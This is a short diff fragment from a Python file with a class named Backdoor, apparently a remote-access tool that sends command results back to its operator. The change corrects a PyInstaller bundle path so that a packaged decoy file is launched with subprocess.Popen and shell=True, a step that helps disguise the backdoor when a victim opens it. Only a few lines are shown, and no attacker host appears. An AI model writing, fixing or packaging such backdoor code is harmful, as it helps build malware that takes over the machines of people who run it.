@@ -68,7 +68,7 @@ class Backdoor:
 
 			self.reliable_send(command_result)
 
-file_name = sys.MEIPASS + "\filename.extension"
+file_name = sys._MEIPASS + "\filename.extension"
 subprocess.Popen(file_name, shell=True)
       
 try:
